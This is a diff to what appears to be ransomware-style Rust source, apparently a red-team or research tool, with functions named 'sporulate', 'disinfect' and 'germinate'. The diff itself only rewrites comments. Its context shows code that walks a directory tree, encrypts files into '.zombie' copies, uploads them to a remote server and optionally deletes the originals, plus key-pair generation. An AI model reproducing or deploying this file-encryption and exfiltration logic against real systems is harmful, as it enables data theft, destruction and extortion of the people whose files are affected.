@@ -21,10 +21,10 @@ use crate::{
     net::upload_file,
 };
 
-// Rust lifetimes make me wanna cry--pun intended
-// Slices are used to avoid informing the number of elements of an array
-// Avoiding Vec for better performance, no dynamic allocation--heap
-/// Permanent, read-only lists that contain permanent, read-only string references
+// Slices are used here for performance and to avoid specifying array size at
+// compile time. This avoids heap allocation (Vec).
+/// Permanent, read-only lists that contain permanent, read-only string
+/// references
 const EXCLUDED_DIRS: &[&str] = &[
     ".git",
     ".svn",
@@ -58,9 +58,9 @@ const EXCLUDED_FILES: &[&str] = &[
 /// files. It's like a spores burst--sporulate.
 ///
 /// # Arguments
-/// - `path`: Starting directory as a `PathBuf`
-/// - `key`: Pathbuf to the private key to decrypt files--see README
-/// - `no_delete`: Boolean flag: false means the original file is deleted
+/// - `path`: The starting directory.
+/// - `key`: Path to the main public key for encryption.
+/// - `no_delete`: If true, the original file is not deleted after encryption.
 /// - `server`: String representing the target server, like `http://server:2673`
 ///
 /// # Logic
@@ -68,7 +68,7 @@ const EXCLUDED_FILES: &[&str] = &[
 /// Iterates through the file system, and for each valid file:
 ///   - Encrypts the file generating a `.zombie` version
 ///   - Sends the encrypted file to the target server
-///   - Optinally, deletes the original file locally
+///   - Optionally, deletes the original file locally
 ///
 /// # Returns
 /// Returns a unit type if finished with success or an AppError if it fails.
@@ -101,13 +101,8 @@ pub async fn sporulate(
 
     let client = Client::new();
 
-    // Iterator creation and customization: Takes a path and creates a lazy
-    // iterator that traverses the directory tree--only scans the file system
-    // as needed.
-    // As it finds each file/folder, it immediately applies a filter to check
-    // if the item's name should be excluded--see the exclusion lists.
-    // Finally, it avoids processing errors, considering only valid entries.
-    // The closure returns true to process the entry of false to skip it.
+    // Create a lazy iterator that traverses the directory tree, filtering out
+    // excluded entries and errors.
     let walker = WalkDir::new(path)
         .into_iter()
         .filter_entry(|entry| {
@@ -142,9 +137,7 @@ pub async fn sporulate(
         .filter_map(Result::ok)
         .filter(|entry| entry.file_type().is_file());
 
-    // This loop consumes the walker iterator and as the loop progresses,
-    // it asks for the next item from the iterator--this request triggers
-    // the iterator to scan the file system!
+    // Consuming the iterator triggers the file system scan.
     info!("Starting encryption process: path={:?}", path);
     for entry in walker {
         let file_path = entry.path();
@@ -182,16 +175,13 @@ pub async fn sporulate(
 /// files to decrypt them. Disinfects a sporulated file.
 ///
 /// # Arguments
-/// - `path`: Starting directory as a `PathBuf`
-/// - `key`: Pathbuf to the private key to decrypt files--see README
-/// - `no_delete`: Boolean flag: false means the .zombie file is deleted
+/// - `path`: The starting directory.
+/// - `key`: Path to the main private key for decryption.
+/// - `no_delete`: If true, the `.zombie` file is not deleted after decryption.
 ///
 /// # Logic
-/// Iterates through the file system, and for each valid file:
-///   - Checks if it has the `.zombie` extension
-///   - Extracts the `.zombie` file header
-///   - Uses the private key provided to decrypt the header
-///   - Decrypts the content using the decrypted secret key and IV
+/// Iterates through the file system, finds `.zombie` files, and calls the
+/// decryption routine for each one.
 pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppError> {
     if !path.exists() {
         return Err(AppError::Io(io::Error::new(
@@ -210,8 +200,7 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
     let private_key = load_private_key(key)?;
     debug!("Loaded main private key from {:?}", key);
 
-    // Creates and sets the directory traversal lazy iterator.
-    // Only valid files with the `.zombie` extension are processed.
+    // Create a lazy iterator that finds all `.zombie` files.
     let walker = WalkDir::new(path)
         .into_iter()
         .filter_map(Result::ok)
@@ -245,8 +234,8 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
     Ok(())
 }
 
-/// Takes a path, generates a Curve25519 key pair, and saves the private and
-/// public keys into the path.
+/// Generates a Curve25519 key pair and saves the Base64-encoded keys to the
+/// specified path.
 ///
 /// # Arguments
 /// - `path`: The path to save the generated key pair named
@@ -278,7 +267,7 @@ pub fn germinate(path: &Path) -> Result<(), AppError> {
     file.write_all(public_key_b64.as_ref())?;
     info!("Main public key saved to: {:?}", public_key_path);
 
-    // Making sure the encoded keys are valid
+    // Verify that the encoded keys can be decoded correctly
     if let Ok(prikey) = b64_decode(&private_key_b64) {
         assert_eq!(private_key_bytes, prikey);
     }
